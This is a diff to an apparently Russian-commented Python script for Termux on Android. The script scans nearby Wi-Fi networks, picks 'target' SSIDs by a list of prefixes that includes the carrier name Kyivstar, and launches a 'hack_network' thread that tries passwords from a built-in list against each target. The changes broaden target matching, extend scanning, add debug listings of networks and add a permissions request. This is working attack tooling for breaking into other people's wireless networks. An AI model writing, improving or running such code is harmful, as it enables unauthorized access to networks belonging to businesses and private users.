@@ -53,7 +53,7 @@ TARGET_PREFIXES = [
     "ADV", "ADS", "PUB", "OUT", "IN", "SHOP", "STORE", "MALL", "HOTEL", "CAFE",
     
     # Префиксы для тестирования
-    "Kyivstar", "KyivStar", "KYIVSTAR"  # Добавлено для тестирования
+    "Kyivstar", "KyivStar", "KYIVSTAR", "Kyivstar_CC"  # Добавлено для тестирования
 ]
 
 PASSWORD_LIST = [
@@ -135,8 +135,13 @@ def is_target_network(ssid):
     if re.match(r"^W\d{2}_", ssid):
         return True
     
-    # Проверяем обычные префиксы
-    return any(ssid.startswith(prefix) for prefix in TARGET_PREFIXES)
+    # Проверяем обычные префиксы (регистронезависимо)
+    ssid_lower = ssid.lower()
+    for prefix in TARGET_PREFIXES:
+        if ssid_lower.startswith(prefix.lower()):
+            return True
+    
+    return False
 
 def try_connect(ssid, password):
     """Попытка подключения через Termux API"""
@@ -202,15 +207,14 @@ def scan_wifi_networks():
     """Надежное сканирование Wi-Fi сетей с использованием Termux API"""
     try:
         # Инициируем сканирование
-        subprocess.run(
+        scan_process = subprocess.Popen(
             ["termux-wifi-scan"],
             stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            timeout=10
+            stderr=subprocess.PIPE
         )
         
-        # Даем время на сканирование
-        time.sleep(3)
+        # Даем время на сканирование (увеличено)
+        time.sleep(5)
         
         # Получаем результаты
         result = subprocess.check_output(
@@ -256,6 +260,7 @@ def main():
         print("\n[!] Установите необходимые зависимости:")
         print("    pkg update && pkg install termux-api")
         print("[!] И скачайте приложение Termux:API из Play Store")
+        print("[!] Предоставьте разрешения: местоположение и управление Wi-Fi")
         return
     
     # Проверка пароля
@@ -296,26 +301,35 @@ def main():
             scan_result = scan_wifi_networks()
             
             if scan_result:
-                networks = parse_networks(scan_result)
-                unique_networks = list(set(networks))
-                
-                print(f"\n[~] Сканирование завершено. Сетей: {len(unique_networks)}")
-                
-                # Отображаем первые 5 сетей для тестирования
-                if unique_networks:
-                    print(f"[i] Обнаружены сети: {', '.join(unique_networks[:5])}" + 
-                          ("..." if len(unique_networks) > 5 else ""))
-                
-                found_targets = False
-                for ssid in unique_networks:
-                    if ssid and is_target_network(ssid):
-                        found_targets = True
-                        print(f"[+] Обнаружена целевая сеть: {ssid}")
-                        # Запускаем проверку паролей в отдельном потоке
-                        Thread(target=hack_network, args=(ssid,), daemon=True).start()
-                
-                if not found_targets:
-                    print("[i] Целевые сети не обнаружены")
+                try:
+                    networks = parse_networks(scan_result)
+                    unique_networks = list(set(networks))
+                    
+                    print(f"\n[~] Сканирование завершено. Сетей: {len(unique_networks)}")
+                    
+                    # Отображаем первые 5 сетей для тестирования
+                    if unique_networks:
+                        print(f"[i] Обнаружены сети: {', '.join(unique_networks[:5])}" + 
+                              ("..." if len(unique_networks) > 5 else ""))
+                    
+                    # ДИАГНОСТИКА: выводим все сети и результат проверки
+                    print("\n[DEBUG] Все обнаруженные сети:")
+                    for i, ssid in enumerate(unique_networks):
+                        target = "ДА" if is_target_network(ssid) else "НЕТ"
+                        print(f"  {i+1}. {ssid} (Целевая: {target})")
+                    
+                    found_targets = False
+                    for ssid in unique_networks:
+                        if ssid and is_target_network(ssid):
+                            found_targets = True
+                            print(f"[+] Обнаружена целевая сеть: {ssid}")
+                            # Запускаем проверку паролей в отдельном потоке
+                            Thread(target=hack_network, args=(ssid,), daemon=True).start()
+                    
+                    if not found_targets:
+                        print("[i] Целевые сети не обнаружены")
+                except Exception as e:
+                    print(f"[!] Ошибка обработки сетей: {e}")
             
             # Ожидание до следующего сканирования
             sleep_time = SCAN_INTERVAL - (time.time() - last_scan)
@@ -329,4 +343,7 @@ def main():
         print(f"[!] Критическая ошибка: {e}")
 
 if __name__ == "__main__":
+    # Проверка разрешений
+    print("[~] Запрос необходимых разрешений...")
+    subprocess.run(["termux-setup-storage"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
     main()
